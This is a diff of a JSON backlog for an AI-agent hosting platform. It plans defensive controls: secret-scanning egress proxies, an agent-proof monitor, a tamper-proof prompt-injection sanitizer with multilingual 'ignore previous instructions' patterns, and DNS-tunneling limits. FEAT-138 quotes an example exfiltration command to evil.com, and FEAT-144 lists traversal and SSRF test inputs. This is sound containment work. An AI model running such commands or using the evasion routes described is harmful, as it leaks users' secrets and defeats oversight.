@@ -1,9 +1,9 @@
 {
-  "description": "ClawHQ backlog \u2014 aligned with evolved strategy (2026-03-28). See docs/STRATEGY.md for strategic context.",
+  "description": "ClawHQ backlog — aligned with evolved strategy (2026-03-28). See docs/STRATEGY.md for strategic context.",
   "items": [
     {
       "id": "FEAT-114",
-      "title": "JMAP email backend \u2014 FastMail-compatible email tool as alternative to himalaya/IMAP",
+      "title": "JMAP email backend — FastMail-compatible email tool as alternative to himalaya/IMAP",
       "intent": "Users on FastMail (or any JMAP provider) must have a native email tool that uses JMAP instead of IMAP.",
       "description": "Clawdius has a battle-tested email-fastmail.py (stdlib Python, no deps) implementing JMAP. ClawHQ's email tool generator only produces himalaya-based IMAP scripts.",
       "priority": "could",
@@ -29,11 +29,11 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "email.ts confirmed: generates himalaya bash wrapper only. Integration AC: generateEmailTool() must accept backend param (not a separate function) \u2014 consistent API. Doctor check integration is a secondary deliverable but needed for completeness. Generated Python must use only json, urllib, sys, os from stdlib \u2014 no requests/httpx. Account routing via --account flag maps to different script (himalaya vs email-jmap.py), not a single polyglot script."
+      "groomingNotes": "email.ts confirmed: generates himalaya bash wrapper only. Integration AC: generateEmailTool() must accept backend param (not a separate function) — consistent API. Doctor check integration is a secondary deliverable but needed for completeness. Generated Python must use only json, urllib, sys, os from stdlib — no requests/httpx. Account routing via --account flag maps to different script (himalaya vs email-jmap.py), not a single polyglot script."
     },
     {
       "id": "FEAT-119",
-      "title": "News aggregator tool \u2014 multi-source scan with deduplication and interest-graph filtering",
+      "title": "News aggregator tool — multi-source scan with deduplication and interest-graph filtering",
       "intent": "Agents that monitor information sources need a unified news aggregator. Foundation for any monitoring or research blueprint.",
       "description": "Clawdius has a 'news' tool that scans X + Substack + Tavily by interest topic, deduplicates, and manages API budget.",
       "priority": "could",
@@ -58,11 +58,11 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "News tool wraps tavily and x tool generators as backends. Dedup via URL hash set in news-state.json. Budget via max_calls_per_scan config field per backend. FEAT-131 (interest graph) must be done first \u2014 news tool filters by interests.json topics. Integration AC: both index.ts export and blueprint YAML references required \u2014 just having news.ts is not enough."
+      "groomingNotes": "News tool wraps tavily and x tool generators as backends. Dedup via URL hash set in news-state.json. Budget via max_calls_per_scan config field per backend. FEAT-131 (interest graph) must be done first — news tool filters by interests.json topics. Integration AC: both index.ts export and blueprint YAML references required — just having news.ts is not enough."
     },
     {
       "id": "FEAT-131",
-      "title": "Interest graph config \u2014 topic-driven content filtering with multi-source routing",
+      "title": "Interest graph config — topic-driven content filtering with multi-source routing",
       "intent": "Agents scanning feeds need a structured interest graph to filter by relevance, not volume.",
       "description": "Clawdius recon (2026-03-29): interests.json defines topics with priority, frequency, per-topic source routing.",
       "priority": "could",
@@ -89,13 +89,13 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "No interests infrastructure exists anywhere in the codebase \u2014 clean slate. interests.json schema: array of InterestTopic objects with topic, priority, frequency, sources. Tool generator produces a shell script or JS script for runtime management (add/remove/list topics). Blueprint types.ts gets optional interests field. Integration AC: configure/generate.ts must call the tool generator and write interests.json \u2014 the tool must be wired into the init path, not just defined. FEAT-119 (news tool) depends on this item."
+      "groomingNotes": "No interests infrastructure exists anywhere in the codebase — clean slate. interests.json schema: array of InterestTopic objects with topic, priority, frequency, sources. Tool generator produces a shell script or JS script for runtime management (add/remove/list topics). Blueprint types.ts gets optional interests field. Integration AC: configure/generate.ts must call the tool generator and write interests.json — the tool must be wired into the init path, not just defined. FEAT-119 (news tool) depends on this item."
     },
     {
       "id": "FEAT-134",
-      "title": "Cron model routing validation \u2014 verify FEAT-113 against Clawdius production model map",
+      "title": "Cron model routing validation — verify FEAT-113 against Clawdius production model map",
       "intent": "FEAT-113 defaults must be validated against real production patterns.",
-      "description": "Clawdius recon (2026-03-29): 11 jobs \u2014 haiku for fast, sonnet for medium, opus for complex.",
+      "description": "Clawdius recon (2026-03-29): 11 jobs — haiku for fast, sonnet for medium, opus for complex.",
       "priority": "could",
       "category": "testing",
       "steps": [
@@ -119,11 +119,11 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "FEAT-113 added model routing per cron job. validate.ts exists (src/config/validate.ts), validate.test.ts exists. Blueprint YAML files confirmed in configs/blueprints/. Sub-hourly threshold = schedule interval <=60 minutes. Integration AC: validateAll() must call validateModelRouting() \u2014 grep proves wiring. The function must return ValidationResult[] consistent with existing LM validators. 11 blueprints have cron, target is at minimum the 7 core ones. Use WARN not ERROR for cost inefficiency (non-fatal)."
+      "groomingNotes": "FEAT-113 added model routing per cron job. validate.ts exists (src/config/validate.ts), validate.test.ts exists. Blueprint YAML files confirmed in configs/blueprints/. Sub-hourly threshold = schedule interval <=60 minutes. Integration AC: validateAll() must call validateModelRouting() — grep proves wiring. The function must return ValidationResult[] consistent with existing LM validators. 11 blueprints have cron, target is at minimum the 7 core ones. Use WARN not ERROR for cost inefficiency (non-fatal)."
     },
     {
       "id": "FEAT-135",
-      "title": "Silence-is-competence identity pattern \u2014 operational philosophy in SOUL.md generation",
+      "title": "Silence-is-competence identity pattern — operational philosophy in SOUL.md generation",
       "intent": "An agent that narrates every action wastes attention. SOUL.md must encode execution philosophy.",
       "description": "Clawdius recon (2026-03-29): SOUL.md encodes silence-is-competence, quality gates, guardian model. ClawHQ generateSoul() lacks this layer.",
       "priority": "could",
@@ -153,7 +153,7 @@
     },
     {
       "id": "FEAT-136",
-      "title": "Telegram egress proxy \u2014 MITM secret scanning for outbound messages",
+      "title": "Telegram egress proxy — MITM secret scanning for outbound messages",
       "intent": "An agent sending Telegram messages must never be able to exfiltrate secrets via message text or captions. The current firewall allows api.telegram.org but does not inspect message content. A prompt-injected agent could encode secrets in replies.",
       "description": "Clawdius battle-tested pattern: redirect api.telegram.org to a host-side HTTPS reverse proxy via extra_hosts in docker-compose.yml. The proxy terminates TLS (self-signed CA trusted via NODE_EXTRA_CA_CERTS), inspects sendMessage/editMessageText/sendPhoto payloads for secret patterns (env var values, base64 variants, token regexes), and either forwards clean messages or replaces dirty ones with '[EGRESS BLOCKED]' + alerts the user. Implementation: (1) generate telegram-egress-proxy.py (stdlib Python, ~600 lines), (2) generate self-signed CA + server cert, (3) add extra_hosts and NODE_EXTRA_CA_CERTS to compose generation, (4) add systemd service for the proxy. Reference: clawdius/scripts/cred-proxy/telegram-egress-proxy.py.",
       "priority": "should",
@@ -183,11 +183,11 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "M-L item. Phased approach: (1) compose.ts \u2014 add enableTelegramProxy option to ComposeOptions, add extra_hosts and NODE_EXTRA_CA_CERTS to ComposeServiceOutput when set. (2) src/secure/telegram-egress-proxy.py \u2014 stdlib Python, ~600 lines. HTTPS reverse proxy on bridge IP port 8443. Terminates TLS with self-signed CA. Inspects sendMessage/editMessageText/sendPhoto payload fields (text, caption). Secret detection: scan against same patterns as sanitizer (env var values, base64, token regexes). Blocked messages replaced with [EGRESS BLOCKED], appended to ops/audit/telegram-egress.log. (3) gen-telegram-certs.sh \u2014 openssl one-liner to generate CA + server cert. (4) systemd service generator in src/operate/automation/. (5) doctor check in src/operate/doctor/checks.ts. generateCompose() must accept enableTelegramProxy:boolean in ComposeOptions. Integration test: compose.test.ts checks extra_hosts when flag set."
+      "groomingNotes": "M-L item. Phased approach: (1) compose.ts — add enableTelegramProxy option to ComposeOptions, add extra_hosts and NODE_EXTRA_CA_CERTS to ComposeServiceOutput when set. (2) src/secure/telegram-egress-proxy.py — stdlib Python, ~600 lines. HTTPS reverse proxy on bridge IP port 8443. Terminates TLS with self-signed CA. Inspects sendMessage/editMessageText/sendPhoto payload fields (text, caption). Secret detection: scan against same patterns as sanitizer (env var values, base64, token regexes). Blocked messages replaced with [EGRESS BLOCKED], appended to ops/audit/telegram-egress.log. (3) gen-telegram-certs.sh — openssl one-liner to generate CA + server cert. (4) systemd service generator in src/operate/automation/. (5) doctor check in src/operate/doctor/checks.ts. generateCompose() must accept enableTelegramProxy:boolean in ComposeOptions. Integration test: compose.test.ts checks extra_hosts when flag set."
     },
     {
       "id": "FEAT-137",
-      "title": "Post-hoc Telegram monitor \u2014 host-side secret scanner the agent cannot disable",
+      "title": "Post-hoc Telegram monitor — host-side secret scanner the agent cannot disable",
       "intent": "Even if the egress proxy is somehow bypassed (cert issue, proxy crash), a host-side monitor must independently scan outbound Telegram messages and alert on secret detection. Defense-in-depth requires layers the agent cannot control.",
       "description": "Clawdius pattern: a cron-driven Python script that polls Telegram getUpdates, filters for bot-sent messages, and scans them for secret patterns. Runs on the host (not in container) so the agent cannot disable it. Alerts via email on detection. Reference: clawdius/scripts/telegram-egress-monitor.py.",
       "priority": "should",
@@ -215,12 +215,12 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "Size S \u2014 Python script with stdlib only. Polls Telegram getUpdates API, filters for outgoing bot messages (from.is_bot=True or matching bot user_id), scans text/caption/photo_caption fields against SECRET_PATTERNS (same patterns as sanitizer). Alert via email (smtplib) or Telegram admin message. Cron schedule: */5 * * * * during configured waking hours. The script must have zero container dependencies \u2014 it calls the Telegram API directly from the host. Store state in ~/.clawhq/ops/telegram-monitor-state.json (last_update_id). Generator: add generateTelegramMonitor(config) to src/operate/automation/ module. Also generate a systemd timer as alternative to cron."
+      "groomingNotes": "Size S — Python script with stdlib only. Polls Telegram getUpdates API, filters for outgoing bot messages (from.is_bot=True or matching bot user_id), scans text/caption/photo_caption fields against SECRET_PATTERNS (same patterns as sanitizer). Alert via email (smtplib) or Telegram admin message. Cron schedule: */5 * * * * during configured waking hours. The script must have zero container dependencies — it calls the Telegram API directly from the host. Store state in ~/.clawhq/ops/telegram-monitor-state.json (last_update_id). Generator: add generateTelegramMonitor(config) to src/operate/automation/ module. Also generate a systemd timer as alternative to cron."
     },
     {
       "id": "FEAT-138",
-      "title": "Curl egress wrapper \u2014 scan POST/PUT/PATCH bodies at PATH level",
-      "intent": "Any curl command the agent runs \u2014 not just tool scripts that call the cred proxy \u2014 must have its outbound body scanned for secrets. The cred proxy only intercepts requests routed to it; a bare 'curl -X POST https://evil.com -d $SECRET' bypasses it entirely.",
+      "title": "Curl egress wrapper — scan POST/PUT/PATCH bodies at PATH level",
+      "intent": "Any curl command the agent runs — not just tool scripts that call the cred proxy — must have its outbound body scanned for secrets. The cred proxy only intercepts requests routed to it; a bare 'curl -X POST https://evil.com -d $SECRET' bypasses it entirely.",
       "description": "Clawdius pattern: a bash script at /usr/local/bin/curl that shadows /usr/bin/curl on PATH. GET/HEAD pass through with zero overhead. POST/PUT/PATCH/DELETE bodies are extracted (handles -d, --data-raw, --json, -F, -T, @- stdin) and piped through the sanitizer's --egress mode. If secrets detected, exit 3 (blocked). Baked into the Docker image so the agent cannot remove it. Reference: clawdius/openclaw/curl-egress-wrapper.",
       "priority": "should",
       "category": "security",
@@ -250,9 +250,9 @@
     },
     {
       "id": "FEAT-139",
-      "title": "Immutable sanitizer layer \u2014 bake ClawWall into read-only image with hash verification",
+      "title": "Immutable sanitizer layer — bake ClawWall into read-only image with hash verification",
       "intent": "The prompt injection scanner must be tamper-proof. If the agent can modify or delete the sanitizer, all inbound content scanning is defeated. The sanitizer must be baked into the Docker image at a read-only path with runtime integrity verification.",
-      "description": "Clawdius pattern: sanitize is COPY'd to /opt/clawwall/ during image build. chmod 444, chown root:root, and SHA256 hash computed and stored alongside. At runtime, every invocation verifies its own hash against the baked-in expected hash \u2014 fail-closed if tampered. The workspace copy is separate (for agent-initiated updates) but the /opt/clawwall/ copy is immutable. Reference: clawdius/openclaw/Dockerfile lines 152-162.",
+      "description": "Clawdius pattern: sanitize is COPY'd to /opt/clawwall/ during image build. chmod 444, chown root:root, and SHA256 hash computed and stored alongside. At runtime, every invocation verifies its own hash against the baked-in expected hash — fail-closed if tampered. The workspace copy is separate (for agent-initiated updates) but the /opt/clawwall/ copy is immutable. Reference: clawdius/openclaw/Dockerfile lines 152-162.",
       "priority": "should",
       "category": "security",
       "steps": [
@@ -278,12 +278,12 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "Two parts: (1) Dockerfile generator changes in generateStage2Dockerfile \u2014 add COPY sanitize /opt/clawwall/sanitize, RUN sha256sum /opt/clawwall/sanitize > /opt/clawwall/sanitize.sha256, chmod 444, chown root:root. (2) Sanitizer self-integrity check \u2014 on startup, re-compute sha256 of own file and compare to /opt/clawwall/sanitize.sha256. Mismatch = process.exit(1). The immutable /opt/clawwall/ path is separate from the workspace copy (which the agent can update). Tools should import from /opt/clawwall/ path for scanning. Check generateStage2Dockerfile signature carefully \u2014 it may need a new security posture param to conditionally include this block. Tests: dockerfile.test.ts for the COPY/chmod/sha256sum block. sanitizer.test.ts for the self-check behavior."
+      "groomingNotes": "Two parts: (1) Dockerfile generator changes in generateStage2Dockerfile — add COPY sanitize /opt/clawwall/sanitize, RUN sha256sum /opt/clawwall/sanitize > /opt/clawwall/sanitize.sha256, chmod 444, chown root:root. (2) Sanitizer self-integrity check — on startup, re-compute sha256 of own file and compare to /opt/clawwall/sanitize.sha256. Mismatch = process.exit(1). The immutable /opt/clawwall/ path is separate from the workspace copy (which the agent can update). Tools should import from /opt/clawwall/ path for scanning. Check generateStage2Dockerfile signature carefully — it may need a new security posture param to conditionally include this block. Tests: dockerfile.test.ts for the COPY/chmod/sha256sum block. sanitizer.test.ts for the self-check behavior."
     },
     {
       "id": "FEAT-140",
       "title": "Trivy image scanning in build pipeline",
-      "intent": "CVEs in the base image and Python/Node dependencies must be surfaced before deployment. The build pipeline must gate on HIGH/CRITICAL vulnerabilities \u2014 not discover them after a security advisory.",
+      "intent": "CVEs in the base image and Python/Node dependencies must be surfaced before deployment. The build pipeline must gate on HIGH/CRITICAL vulnerabilities — not discover them after a security advisory.",
       "description": "Add trivy image scan after docker build in the build pipeline. For clawhq deploy: scan and warn on HIGH/CRITICAL (non-blocking for first deploy, blocking for updates). For clawhq update: scan and block on CRITICAL, warn on HIGH. Add --skip-scan flag for users who want to bypass. Reference: Clawdius FEAT-043.",
       "priority": "should",
       "category": "security",
@@ -311,11 +311,11 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "Add scanImage(imageRef:string, opts:{blockOnCritical:boolean}):Promise<ScanResult> to build.ts. Detect trivy in PATH first \u2014 if absent, warn and skip (do not fail). Parse JSON output from trivy image --format json --exit-code 0. Extract Vulnerabilities array, count by Severity. For deploy: report counts as warnings. For update: if CRITICAL count > 0, throw and abort. skip-scan flag sets opts.blockOnCritical=false and skips scan entirely. Add trivy doctor check in src/operate/doctor/checks.ts. Tests in build.test.ts mock execSync for trivy invocations."
+      "groomingNotes": "Add scanImage(imageRef:string, opts:{blockOnCritical:boolean}):Promise<ScanResult> to build.ts. Detect trivy in PATH first — if absent, warn and skip (do not fail). Parse JSON output from trivy image --format json --exit-code 0. Extract Vulnerabilities array, count by Severity. For deploy: report counts as warnings. For update: if CRITICAL count > 0, throw and abort. skip-scan flag sets opts.blockOnCritical=false and skips scan entirely. Add trivy doctor check in src/operate/doctor/checks.ts. Tests in build.test.ts mock execSync for trivy invocations."
     },
     {
       "id": "FEAT-141",
-      "title": "DNS tunneling mitigation \u2014 restrict port 53 to specific resolvers",
+      "title": "DNS tunneling mitigation — restrict port 53 to specific resolvers",
       "intent": "The egress firewall allows unrestricted port 53 to any destination. This is the only unfiltered egress path. DNS tunneling can encode secrets in subdomain labels, bypassing all content scanning layers.",
       "description": "Update firewall generator to restrict DNS (port 53) to specific resolver IPs (1.1.1.1, 8.8.8.8, or user-configured) instead of allowing to 0.0.0.0/0. This closes the last unfiltered egress path. Reference: Clawdius FEAT-037.",
       "priority": "should",
@@ -340,7 +340,7 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "XS scope change to firewall rule generation. buildExpectedRules() must accept optional dnsResolvers:string[] config (default ['1.1.1.1','8.8.8.8']). The blanket ACCEPT for port 53 dpt:domain to anywhere/0.0.0.0 is replaced with per-resolver ACCEPT rules. Add DNS resolver test cases to existing firewall.test.ts. residual risk note: tunneling via allowed resolvers is still theoretically possible \u2014 document in comments."
+      "groomingNotes": "XS scope change to firewall rule generation. buildExpectedRules() must accept optional dnsResolvers:string[] config (default ['1.1.1.1','8.8.8.8']). The blanket ACCEPT for port 53 dpt:domain to anywhere/0.0.0.0 is replaced with per-resolver ACCEPT rules. Add DNS resolver test cases to existing firewall.test.ts. residual risk note: tunneling via allowed resolvers is still theoretically possible — document in comments."
     },
     {
       "id": "FEAT-142",
@@ -402,7 +402,7 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "Two independent guards in proxy-server.ts. maxBodySize: check Content-Length header before reading body \u2014 reject 413 immediately, no buffering. timeout: wrap upstream fetch in Promise.race with AbortController. Both configurable in ProxyRoute type (new fields: maxBodySizeBytes?: number, timeoutMs?: number). Defaults: maxBodySize=10MB, timeout=30s. Per-route overrides: CalDAV route gets larger body (50MB), email route gets longer timeout (120s). Rejections call existing audit logger. Tests go in proxy.test.ts alongside existing route/config tests."
+      "groomingNotes": "Two independent guards in proxy-server.ts. maxBodySize: check Content-Length header before reading body — reject 413 immediately, no buffering. timeout: wrap upstream fetch in Promise.race with AbortController. Both configurable in ProxyRoute type (new fields: maxBodySizeBytes?: number, timeoutMs?: number). Defaults: maxBodySize=10MB, timeout=30s. Per-route overrides: CalDAV route gets larger body (50MB), email route gets longer timeout (120s). Rejections call existing audit logger. Tests go in proxy.test.ts alongside existing route/config tests."
     },
     {
       "id": "FEAT-144",
@@ -431,7 +431,7 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "Three defenses in proxy-server.ts: (1) path canonicalization \u2014 new URL(path, base).pathname to resolve ../ sequences before route matching, (2) host validation \u2014 final URL host must equal configured upstream host, (3) private IP block \u2014 resolve final URL hostname with dns.lookup(), reject if in 10/8, 172.16/12, 192.168/16, 127/8, 169.254/16 ranges. Private IP check is async (DNS lookup). Tests: path traversal attempts (../../etc/passwd), direct private IP targeting (http://192.168.1.1), DNS rebinding (hostname resolving to 127.0.0.1). All rejections call existing audit logger. Tests go in proxy.test.ts."
+      "groomingNotes": "Three defenses in proxy-server.ts: (1) path canonicalization — new URL(path, base).pathname to resolve ../ sequences before route matching, (2) host validation — final URL host must equal configured upstream host, (3) private IP block — resolve final URL hostname with dns.lookup(), reject if in 10/8, 172.16/12, 192.168/16, 127/8, 169.254/16 ranges. Private IP check is async (DNS lookup). Tests: path traversal attempts (../../etc/passwd), direct private IP targeting (http://192.168.1.1), DNS rebinding (hostname resolving to 127.0.0.1). All rejections call existing audit logger. Tests go in proxy.test.ts."
     },
     {
       "id": "FEAT-145",
@@ -466,7 +466,7 @@
     },
     {
       "id": "FEAT-146",
-      "title": "Multilingual injection patterns \u2014 expand ClawWall coverage to 15+ languages",
+      "title": "Multilingual injection patterns — expand ClawWall coverage to 15+ languages",
       "intent": "A prompt injection in Turkish, Hindi, or Portuguese currently bypasses all multilingual detection. Coverage must match the languages an attacker would reasonably try.",
       "description": "The sanitizer covers 8 languages for 'ignore previous instructions' (French, Spanish, German, Japanese, Chinese, Korean, Russian, Arabic). Add at minimum: Hindi, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Italian. Reference: Clawdius FEAT-068.",
       "priority": "should",
@@ -490,11 +490,11 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "MULTILINGUAL_INJECTION in patterns.ts has 8 patterns (French, Spanish, German, Japanese, Chinese, Korean, Russian, Arabic). Add 7 more: Italian, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Hindi. Use word-order-correct regex \u2014 NOT machine translation of English regex. Each language needs correct verb-object order and script. Thai/Vietnamese need Unicode-aware patterns. Test file must have one describe block per new language with an injection string and a safe string. Verify commands test actual detection behavior, not source structure."
+      "groomingNotes": "MULTILINGUAL_INJECTION in patterns.ts has 8 patterns (French, Spanish, German, Japanese, Chinese, Korean, Russian, Arabic). Add 7 more: Italian, Turkish, Portuguese, Vietnamese, Thai, Indonesian, Hindi. Use word-order-correct regex — NOT machine translation of English regex. Each language needs correct verb-object order and script. Thai/Vietnamese need Unicode-aware patterns. Test file must have one describe block per new language with an injection string and a safe string. Verify commands test actual detection behavior, not source structure."
     },
     {
       "id": "FEAT-147",
-      "title": "Egress firewall test suite \u2014 prove the firewall works after every apply",
+      "title": "Egress firewall test suite — prove the firewall works after every apply",
       "intent": "Firewall rules must be tested, not trusted. A test suite that runs from inside the container must verify: allowed domains connect, blocked domains reject, blocked ports reject. Without this, regressions are silent.",
       "description": "Generate a test script that runs via docker exec after firewall setup. Tests: (1) allowed HTTPS domains connect, (2) blocked HTTPS domains reject, (3) DNS resolves, (4) non-allowlisted ports reject. Run automatically after clawhq deploy and clawhq firewall apply. Reference: Clawdius FEAT-045.",
       "priority": "should",
@@ -520,13 +520,13 @@
       "passes": false,
       "readyForSprint": true,
       "groomedAt": "2026-03-31",
-      "groomingNotes": "Add generateFirewallTest(allowlist) function to firewall.ts. Output: a Node.js one-liner script that docker exec runs inside the container. Test cases: (1) fetch allowed HTTPS domain returns 200, (2) fetch blocked domain throws ECONNREFUSED or times out, (3) dns.resolve() resolves allowed domain. Run after firewall apply in deploy.ts \u2014 if test exits non-zero, abort deploy and surface error. Use node -e one-liners (no curl dependency since curl may be wrapped by FEAT-138). Tests in firewall.test.ts verify generateFirewallTest() output contains correct test logic. Tests in launcher.test.ts verify deploy flow aborts on test failure."
+      "groomingNotes": "Add generateFirewallTest(allowlist) function to firewall.ts. Output: a Node.js one-liner script that docker exec runs inside the container. Test cases: (1) fetch allowed HTTPS domain returns 200, (2) fetch blocked domain throws ECONNREFUSED or times out, (3) dns.resolve() resolves allowed domain. Run after firewall apply in deploy.ts — if test exits non-zero, abort deploy and surface error. Use node -e one-liners (no curl dependency since curl may be wrapped by FEAT-138). Tests in firewall.test.ts verify generateFirewallTest() output contains correct test logic. Tests in launcher.test.ts verify deploy flow aborts on test failure."
     },
     {
       "id": "FEAT-148",
-      "title": "Security architecture documentation \u2014 threat model, architecture diagram, runbook",
+      "title": "Security architecture documentation — threat model, architecture diagram, runbook",
       "intent": "Community users deploying ClawHQ must understand the security architecture in 60 seconds. A threat model, architecture diagram, and operational runbook are prerequisites for community trust and adoption.",
-      "description": "Create three documents: (1) docs/THREAT-MODEL.md \u2014 threat actors, in-scope attacks, defense layers mapped to threats, residual risks, accepted risks. (2) docs/ARCHITECTURE-SECURITY.md \u2014 Mermaid diagram showing container boundary, network boundaries, data flows through cred proxy / egress firewall / sanitizer / Telegram proxy. (3) docs/RUNBOOK.md \u2014 for each alert type: trigger, what to check, how to remediate. Reference: Clawdius FEAT-059, FEAT-060, FEAT-064.",
+      "description": "Create three documents: (1) docs/THREAT-MODEL.md — threat actors, in-scope attacks, defense layers mapped to threats, residual risks, accepted risks. (2) docs/ARCHITECTURE-SECURITY.md — Mermaid diagram showing container boundary, network boundaries, data flows through cred proxy / egress firewall / sanitizer / Telegram proxy. (3) docs/RUNBOOK.md — for each alert type: trigger, what to check, how to remediate. Reference: Clawdius FEAT-059, FEAT-060, FEAT-064.",
       "priority": "should",
       "category": "documentation",
       "steps": [
@@ -552,15 +552,15 @@
     },
     {
       "id": "FEAT-154",
-      "title": "LifeOps and Dev blueprints \u2014 universal base + developer profile",
+      "title": "LifeOps and Dev blueprints — universal base + developer profile",
       "intent": "Ship the two highest-demand blueprints: LifeOps (universal base, default for clawhq init) and Dev (natural fit for self-hosted community). Each must be a complete, opinionated agent design.",
       "description": "LifeOps composes email, calendar, tasks, morning-brief, schedule-guard, construct with hardened posture. Dev composes gh, git, code review, PR creation, CI monitoring with restricted egress. Each blueprint must pass validation, have customization questions, day_in_the_life narrative, correct egress_domains, and appropriate autonomy model. Check existing blueprints in configs/blueprints/ for overlap.",
       "priority": "should",
       "category": "blueprints",
       "steps": [
-        "Check existing configs/blueprints/ for overlap \u2014 update or deprecate as needed",
-        "Create configs/blueprints/lifeops.yaml \u2014 email, calendar, tasks, morning-brief, schedule-guard, construct. Hardened posture, allowlist-only egress. Customization: communication style, auto-reply comfort, priority contacts. This is the default for clawhq init --guided.",
-        "Create configs/blueprints/dev.yaml \u2014 gh, git (built-in), code review, PR creation, CI monitoring. Hardened posture, restricted egress (GitHub, Sentry). Customization: primary language, repo scope, review style. Terse, technical personality.",
+        "Check existing configs/blueprints/ for overlap — update or deprecate as needed",
+        "Create configs/blueprints/lifeops.yaml — email, calendar, tasks, morning-brief, schedule-guard, construct. Hardened posture, allowlist-only egress. Customization: communication style, auto-reply comfort, priority contacts. This is the default for clawhq init --guided.",
+        "Create configs/blueprints/dev.yaml — gh, git (built-in), code review, PR creation, CI monitoring. Hardened posture, restricted egress (GitHub, Sentry). Customization: primary language, repo scope, review style. Terse, technical personality.",
         "Add profile_ref to each blueprint mapping to MISSION_PROFILE_DEFAULTS entry",
         "Ensure both blueprints pass all validation checks",
         "Write blueprint preview content for both"
@@ -587,19 +587,19 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-04-08",
-      "groomingNotes": "Split from original FEAT-154 (5 blueprints was too large for one sprint). LifeOps is the universal base \u2014 most users start here. Dev is the most natural for the self-hosted community. Each should feel polished and opinionated, not a generic template. Use personality dimensions: LifeOps warm/helpful, Dev terse/technical. Check existing blueprints for overlap before creating new ones."
+      "groomingNotes": "Split from original FEAT-154 (5 blueprints was too large for one sprint). LifeOps is the universal base — most users start here. Dev is the most natural for the self-hosted community. Each should feel polished and opinionated, not a generic template. Use personality dimensions: LifeOps warm/helpful, Dev terse/technical. Check existing blueprints for overlap before creating new ones."
     },
     {
       "id": "FEAT-158",
-      "title": "Research, Markets, and Marketing blueprints \u2014 domain-specific profiles",
+      "title": "Research, Markets, and Marketing blueprints — domain-specific profiles",
       "intent": "Ship 3 domain-specific blueprints that prove ClawHQ works beyond general-purpose: Research (85% LLM use case), Markets (niche but proves pattern), Marketing (content creators).",
       "description": "Research: tavily, web_fetch, synthesis, knowledge base. Markets: quote, trade-journal, eod-review with generic trading SOP runbook. Marketing: x (read), substack, content-seed. Each must pass validation, have customization questions, day_in_the_life, correct egress_domains, appropriate autonomy model, and domain-appropriate personality.",
       "priority": "should",
       "category": "blueprints",
       "steps": [
-        "Create configs/blueprints/research.yaml \u2014 tavily, web_fetch (built-in), synthesis, knowledge base. Hardened posture, restricted egress (search APIs). Customization: research depth, citation style, output format. Analytical personality.",
-        "Create configs/blueprints/markets.yaml \u2014 quote, trade-journal, eod-review. Hardened posture, restricted egress (finance APIs). Customization: trading style, risk tolerance, market focus. Include generic trading SOP as runbook.",
-        "Create configs/blueprints/marketing.yaml \u2014 x (read), substack, content-seed. Hardened posture, restricted egress (social APIs). Customization: content voice, posting frequency, platform focus. Creative personality.",
+        "Create configs/blueprints/research.yaml — tavily, web_fetch (built-in), synthesis, knowledge base. Hardened posture, restricted egress (search APIs). Customization: research depth, citation style, output format. Analytical personality.",
+        "Create configs/blueprints/markets.yaml — quote, trade-journal, eod-review. Hardened posture, restricted egress (finance APIs). Customization: trading style, risk tolerance, market focus. Include generic trading SOP as runbook.",
+        "Create configs/blueprints/marketing.yaml — x (read), substack, content-seed. Hardened posture, restricted egress (social APIs). Customization: content voice, posting frequency, platform focus. Creative personality.",
         "Add profile_ref to each blueprint mapping to MISSION_PROFILE_DEFAULTS entry",
         "Ensure all 3 blueprints pass validation checks",
         "Write blueprint preview content for all 3"
@@ -627,21 +627,21 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-04-08",
-      "groomingNotes": "Split from original FEAT-154. Depends on FEAT-156 (profile skills) since markets.yaml needs eod-review/trade-journal and marketing.yaml needs content-seed. Research appeals to the 85% who use LLMs for research \u2014 analytical personality. Markets is niche but proves the domain-specific pattern. Marketing covers content creators \u2014 creative personality. Use personality dimensions system for each."
+      "groomingNotes": "Split from original FEAT-154. Depends on FEAT-156 (profile skills) since markets.yaml needs eod-review/trade-journal and marketing.yaml needs content-seed. Research appeals to the 85% who use LLMs for research — analytical personality. Markets is niche but proves the domain-specific pattern. Marketing covers content creators — creative personality. Use personality dimensions system for each."
     },
     {
       "id": "FEAT-155",
-      "title": "Telegram MITM compose sidecar \u2014 egress proxy with CA generation for secret scanning",
+      "title": "Telegram MITM compose sidecar — egress proxy with CA generation for secret scanning",
       "intent": "When Telegram is the messaging channel, the agent can exfiltrate secrets through outbound bot messages. The egress firewall can't inspect TLS payloads. A MITM proxy sidecar intercepts Telegram API calls, scans for embedded secrets, and blocks exfiltration attempts.",
       "description": "Extends FEAT-136 (already in backlog) with compose generation. The proxy script is a static asset. clawhq generates: (1) CA cert + server cert via openssl, (2) docker-compose sidecar service with TLS termination, (3) extra_hosts entry redirecting api.telegram.org to proxy, (4) NODE_EXTRA_CA_CERTS env var pointing to injected CA cert. Only generated when channel is Telegram and posture is hardened or under-attack.",
       "priority": "could",
       "category": "security",
       "steps": [
         "Create src/secure/telegram-proxy/ directory for static proxy assets",
-        "Add telegram-egress-proxy.py as static asset \u2014 HTTPS reverse proxy scanning Bot API payloads (sendMessage, editMessageText, etc.) for embedded secrets",
-        "Add CA cert generation script: gen-telegram-certs.sh \u2014 generates self-signed CA + server cert for api.telegram.org",
